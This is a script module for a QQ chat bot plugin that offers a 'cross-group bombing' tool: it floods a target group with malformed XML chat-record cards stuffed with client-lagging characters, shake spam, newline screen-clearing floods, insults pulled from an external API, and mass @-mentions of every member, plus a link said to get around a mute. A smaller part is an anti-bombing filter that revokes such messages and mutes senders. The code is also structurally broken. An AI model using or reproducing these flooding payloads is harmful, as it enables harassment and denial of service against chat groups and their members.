
import com.bug.utils.JSONUtils;
import java.util.*;
import java.lang.*;
import android.content.*;
import android.widget.*;
import android.app.*;
import com.tencent.mobileqq.activity.ChatActivityFacade;
import mqq.app.BaseActivity;
import mqq.app.MobileQQ;
import com.tencent.mobileqq.data.AtTroopMemberInfo;
import com.tencent.mobileqq.activity.aio.SessionInfo;
import com.tencent.mobileqq.activity.aio.BaseSessionInfo;
import com.tencent.mobileqq.app.QQAppInterface;
import com.tencent.mobileqq.app.BusinessHandlerFactory;
import com.tencent.common.app.BaseApplicationImpl;
import com.tencent.mobileqq.friend.api.IFriendDataService;
public boolean[] chose(){
boolean qd=false;
Activity act= GetActivity();
String[] ww={"忽略群主","忽略管理","忽略Q群机器人","忽略我的好友"};
boolean[] xx={false,false,true,false};
act.runOnUiThread(new Runnable(){
public void run(){
AlertDialog.Builder dialog = new AlertDialog.Builder(act,AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
dialog.setTitle("艾特忽略");
dialog.setMultiChoiceItems(ww, xx, new DialogInterface.OnMultiChoiceClickListener(){
public void onClick(DialogInterface dialog, int which, boolean isChecked){
xx[which]=isChecked;
}});
dialog.setPositiveButton("确定", new DialogInterface.OnClickListener(){
public void onClick(DialogInterface dialog, int which){
dialog.dismiss();
qd=true;}}).setNegativeButton("取消", null).show();;
dialog.setCancelable(false);
dialog.show();
}
});
while(!qd){Thread.sleep(100);} return xx;
}
public List adm(String qun){
for(Object c:getGroupList()){
if(c.GroupUin.equals(qun)){
return Arrays.asList(c.AdminList);
}
}
return new ArrayList();
}

public  String own(String qun){
for(Object c:getGroupList()){
if(c.GroupUin.equals(qun)){
return c.GroupOwner;}}
return "";
}
int k=9;
//卑微萌新
Object app=BaseApplicationImpl.getApplication().getRuntime();
Object Friend=app.getRuntimeService(IFriendDataService.class);
public List frilist(){
List list1=Friend.getAllFriends(false);
ArrayList list = new ArrayList();
for(Object c:list1){
list.add(c.uin);
}
return list;
}


public List splitlist(List list, int listSize){
if(null==list||0==listSize){
return new ArrayList();
}
int length = list.size();
int num = ( length + listSize- 1 )/listSize; 
List newList = new ArrayList(num);
for (int i = 0; i < num; i++) {
int from = i * listSize;
int to = (i+1) * listSize< length ? ( i+1 ) * listSize: length ;
newList.add(list.subList(from, to)) ;
}
return  newList ;
}
    
    
public void atall(ArrayList ulist,String n,text){
String tt=text+"​";
List nlist=splitlist(ulist,700);
for(List xlist:nlist){
String t1=tt;
ArrayList alist=new ArrayList();
for(String uin:xlist){
AtTroopMemberInfo at=new AtTroopMemberInfo();
at.uin=Long.parseLong(uin);
at.startPos=(short)t1.length();
at.textLen=(short)1;
alist.add(at);
t1=t1+"​";}
BaseSessionInfo base=new BaseSessionInfo();    
base.a=1;       
base.b=n;
base.c="";
SessionInfo base2=new SessionInfo(base);
ChatActivityFacade.a(BaseApplicationImpl.getApplication().getRuntime(), context, base2,t1,alist);
}
}
public boolean Module_攻防(Object msg)
{
	if(!MySwitch.CheckSwitch(msg.Message_GroupUin, "攻防系统")) return false;
	if(!IsGroupAdmin(msg.Message_GroupUin,msg.Message_UserUin) && MySwitch.CheckSwitch(msg.Message_GroupUin,"菜单限制")) return false;
		String 域名 = item.GetItemData("Api", "域名", "地址", "1");
			if(msg.Message_UserUin.equals(mQQ))
	{
public void z1(String qun,String o1){
new java.lang.Thread(new Runnable(){
			public void run(){
int n1=Integer.parseInt(o1);
     for(int i1=0;i1<n1;i1++)
            {
            for(int i=0;i<30;i++){msg=msg+"ܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷ";}
            MyMsgApi.Message_Send_Group_Card(qun, "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?><msg serviceID=\"35\" templateID=\"1\" action=\"viewMultiMsg\" brief=\"[聊天记录]\" m_resid=\"XoLLqN9G9Qwt6h1FZnxiaMScTfQZxc/4LjOvviAn1m6sCcyMZlEJl2usNO/odEvB\" m_fileName=\"7141192057590391018\" tSum=\"2\" sourceMsgId=\"0\" url=\"\" flag=\"3\" adverSign=\"0\" multiMsgFlag=\"0\"><item layout=\"1\" advertiser_id=\"0\" aid=\"0\"><title size=\"34\" maxLines=\"2\" lineSpace=\"12\">群聊的聊天记录</title><title size=\"26\" color=\"#777777\" maxLines=\"2\" lineSpace=\"12\">"+msg+"</title><hr hidden=\"false\" style=\"0\" /><summary size=\"26\" color=\"#777777\">查看2条转发消息</summary></item><source name=\"聊天记录\" icon=\"\" action=\"\" appid=\"-1\" /></msg>");
            Thread.sleep(1000*2);
            }

}
                        }).start();
}
public void z2(String qun, String o2){ 
new java.lang.Thread(new Runnable(){ public void run(){
int n2=Integer.parseInt(o2);
 for(int i2=0;i2<n2;i2++){
sendShake(qun); 
return false;
 }
 }}).start();}
    
  public void z3(String qun, String o3){ 
int n3=Integer.parseInt(o3);
new java.lang.Thread(new Runnable(){ public void run(){
 for(int i3=0;i3<n3;i3++){
 MyMsgApi.Message_Send_Group(qun,"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n天歌清屏");
 Thread.sleep(1000*2);
 }
}}).start();}
public void z4(String qun, String o4){ 
int n4=Integer.parseInt(o4);
new java.lang.Thread(new Runnable(){ public void run(){
 for(int i4=0;i4<n4;i4++){
String mr = http.get("http://fuyhi.top/api/ktff/api.php?");
 JSONObject b=new JSONObject(mr);//json解析
JSONObject b=b.getJSONObject("data");
String yiyan=b.getString("yiyan");
  MyMsgApi.Message_Send_Group(qun, yiyan);Thread.sleep(1000*2);
 }
 }}).start();}   
 public void z5(String qun, String o5){ 
int n5=Integer.parseInt(o5);
new java.lang.Thread(new Runnable(){ public void run(){
setCard(qun,mQQ," ");
Toast("已修改为空白昵称");
 for(int i5=0;i5<n5;i5++){
MyMsgApi.Message_Send_Group(qun, "జ్ఞ ా رً ॣ [AtQQ=2854196310]");
Thread.sleep(1000*2);
 }
 }}).start();}   
 if(msg.Message_Content.equals("跨群炸群"))
           {
  initActivity();
	ThisActivity.runOnUiThread(new Runnable()
	{
		public void run()
		{
		TextView srk0 = new TextView(ThisActivity);
			srk0.setText(Html.fromHtml("<font color=\"#0000FF\">"+"群号"+"</font>"));
final EditText t10 = new EditText(ThisActivity);
			t10.setHint("请输入要炸的群号，不输入默认炸本群");
			TextView srk1 = new TextView(ThisActivity);
			srk1.setText(Html.fromHtml("<font color=\"#0000FF\">"+"次数"+"</font>"));
			final EditText t11 = new EditText(ThisActivity);
			t11.setHint("请输入卡屏次数");
			TextView srk2 = new TextView(ThisActivity);
			srk2.setText(Html.fromHtml("<font color=\"#0000FF\">"+"次数"+"</font>"));
final EditText t12 = new EditText(ThisActivity);
			t12.setHint("请输入抖动次数");
			TextView srk3 = new TextView(ThisActivity);
			srk3.setText(Html.fromHtml("<font color=\"#0000FF\">"+"次数"+"</font>"));
final EditText t13 = new EditText(ThisActivity);
			t13.setHint("请输入文字清屏次数");
TextView srk4 = new TextView(ThisActivity);
			srk4.setText(Html.fromHtml("<font color=\"#0000FF\">"+"次数"+"</font>"));
final EditText t14 = new EditText(ThisActivity);
			t14.setHint("请输入口吐芬芳次数");
TextView srk5 = new TextView(ThisActivity);
			srk5.setText(Html.fromHtml("<font color=\"#0000FF\">"+"次数"+"</font>"));
final EditText t15 = new EditText(ThisActivity);
			t15.setHint("请输入Q群管家刷屏次数");
LinearLayout layout=new LinearLayout(ThisActivity);
        layout.setOrientation(LinearLayout.VERTICAL);
  layout.addView(srk0);    layout.addView(t10);
      layout.addView(srk1);    layout.addView(t11);
      layout.addView(srk2);    layout.addView(t12);
      layout.addView(srk3);   layout.addView(t13);
      layout.addView(srk4);    layout.addView(t14); 
  layout.addView(srk5);    layout.addView(t15);
new AlertDialog.Builder(ThisActivity, AlertDialog.THEME_HOLO_LIGHT).setTitle("                跨群炸群").setView(layout).setPositiveButton("开始炸群", new DialogInterface.OnClickListener()
			{
				public void onClick(DialogInterface dialogInterface, int i)
				{
new Thread(new Runnable(){
public void run(){
String qh=t10.getText().toString();
if(qh.equals("")){
qh+=msg.Message_GroupUin;}
sendTip(msg.msg,""+qh);
String n1=t11.getText().toString();
sendTip(msg.msg,""+n1);
if(n1.equals("")){}else{z1(qh,n1);}
String n2=t12.getText().toString();
if(n2.equals("")){}else{z2(qh,n2);}
String n3=t13.getText().toString();
if(n3.equals("")){}else{z3(qh,n3);}
String n4=t14.getText().toString();
if(n4.equals("")){}else{z4(qh,n4);}
String n5=t15.getText().toString();
if(n5.equals("")){}else{z5(qh,n5);}
}}).start();}
					}).setNeutralButton("艾特全体"+"\n"+"QQ版本8885及以下", new DialogInterface.OnClickListener()
	{
	public void onClick(DialogInterface dialogInterface, int i)
	{
	new Thread(new Runnable(){
public void run(){
 if(!http.get(域名+"/API/other/nc/nc/yhcx.php?q="+mQQ).equals("1"))
 {
initActivity();ThisActivity.runOnUiThread(new Runnable(){public void run(){AlertDialog alertDialog = new AlertDialog.Builder(ThisActivity,AlertDialog.THEME_HOLO_LIGHT).create();alertDialog.setTitle("未激活提示:");alertDialog.setMessage("请加入天歌Java官方群聊发送☞激活艾特全体权限☜进行免费激活");
alertDialog.setButton(DialogInterface.BUTTON_NEGATIVE, "确定", new DialogInterface.OnClickListener(){public void onClick(DialogInterface dialog, int which){}});alertDialog.show();}});
	return true;
 }
				String x="";
String qh=t10.getText().toString();
if(qh.equals("")){qh+=msg.Message_GroupUin;}
String text=" ";
ArrayList mlist = getGroupMemberList(qh);
boolean[] cs=chose();
ArrayList ulist=new ArrayList();
for(Object c:mlist){
if(cs[2]&&c.UserUin.startsWith("2854"))continue;
ulist.add(c.UserUin);
}
if(cs[0])ulist.remove(own(qh));
if(cs[1])ulist.removeAll(adm(qh));
if(cs[3])ulist.removeAll(frilist());
atall(ulist,qh,text);
}
 }).start();}
          }).setNegativeButton("突破禁言", new DialogInterface.OnClickListener()
			{
				public void onClick(DialogInterface dialogInterface, int i)
				{
			String qh=t10.getText().toString();
            if(qh.equals("")){qh+=msg.Message_GroupUin;}
			MyMsgApi.Message_Send_Private(msg.Message_GroupUin, mQQ, "群号:"+qh+"\nhttps://qvideo.qq.com/mixed/m/mqq-entry.html?_bid=2725&_wv=16778243&_hywv=1&gId="+qh);
			Toast("已私发");
				}
			}).show();
		}
	});
}
	public void delete(Object data)
{
data.AppInterface.getMessageFacade().a(data.msg,true);
}
	if(msg.Message_Content.contains("a@全体") || msg.Message_Content.contains("ܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷܷ"))
	{
revokeMsg(msg.msg);
delete(msg.msg);
}


	public void delete(Object data)
{
data.AppInterface.getMessageFacade().a(data.msg,true);
}

	if(item.GetItemDataInt(msg.Message_GroupUin, "本群屏蔽", "防炸群", "开关") == 1)
		{
	if(msg.Message_Content.contains("ܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶܶ") || msg.Message_Content.contains("۬ۧۙ۬") || msg.Message_Content.contains("疯子社 ")||msg.Message_Content.contains("乐鱼招商联系佳佳:")||msg.Message_Content.contains("🚫停止下注🚫核对🚫")||msg.Message_Content.contains("下赌注")||msg.Message_Content.contains("赌博")||msg.Message_Content.contains("下注")||msg.Message_Content.contains("六合彩"))
	{
revokeMsg(msg.msg);
delete(msg.msg);
MyMsgApi.Group_Forbidden(msg.Message_GroupUin, msg.Message_UserUin, 2592000);
sendTip(msg.msg,"已屏蔽来自 "+msg.nickName+"("+msg.Message_UserUin+") 的疑似一条炸群消息");
}
if(msg.Message_Content.startsWith("")){
long a=0;
if(msg.Message_UserUin.equals(MyUin)){
}else{
for(String AtQQ: msg.atList)
			{a++;}
if(a>5){MyMsgApi.Group_Forbidden(msg.Message_GroupUin, msg.Message_UserUin,2592000);MyMsgApi.Group_Forbidden_All(msg.Message_GroupUin, true);MyMsgApi.Message_Send_Group(msg.Message_GroupUin, msg.Message_UserUin+"疑似发了一条艾特全体");}}}
}

	if(item.GetItemDataInt(msg.Message_GroupUin, "admin", "屏蔽QQ消息", msg.Message_UserUin) == 1)
		{
revokeMsg(msg.msg);
delete(msg.msg);
		
		}

    if(msg.Message_Content.equals("开启本群防炸群"))
		{
	item.SetItemData(msg.Message_GroupUin, "本群屏蔽", "防炸群", "开关", 1);
	item.SetItemData(msg.Message_GroupUin, "本群屏蔽", "防炸群", "开关", 1);
		MyMsgApi.Message_Send_Group(msg.Message_GroupUin,"提示:本群防炸群已开启！\n针对对象:卡屏、部分封群信息、TL模块的艾特全体\n功能效果:提示、撤回、禁言、屏蔽、全禁");
	}
	if(msg.Message_Content.equals("关闭本群防炸群"))
		{
		item.SetItemData(msg.Message_GroupUin, "本群屏蔽", "防炸群", "开关", 0);
		MyMsgApi.Message_Send_Group(msg.Message_GroupUin,"提示:本群防炸群已关闭！");
	}
	
		if(msg.Message_Content.startsWith("添加本群消息屏蔽 "))
		{
			String QQUin = msg.Message_Content.substring(9);
				item.SetItemData(msg.Message_GroupUin, "admin", "屏蔽QQ消息", QQUin, 1);
			MyMsgApi.Message_Send_Group(msg.Message_GroupUin, "已添加对QQ "+QQUin+"本群消息的屏蔽！");
		}	
		if(msg.Message_Content.startsWith("取消本群消息屏蔽 "))
		{
			String QQUin = msg.Message_Content.substring(9);
			item.DeleteItem(msg.Message_GroupUin, "admin", "屏蔽QQ消息", QQUin);
		MyMsgApi.Message_Send_Group(msg.Message_GroupUin, "已取消对QQ "+QQUin+"本群消息的屏蔽！");
		}
	}
return false;
}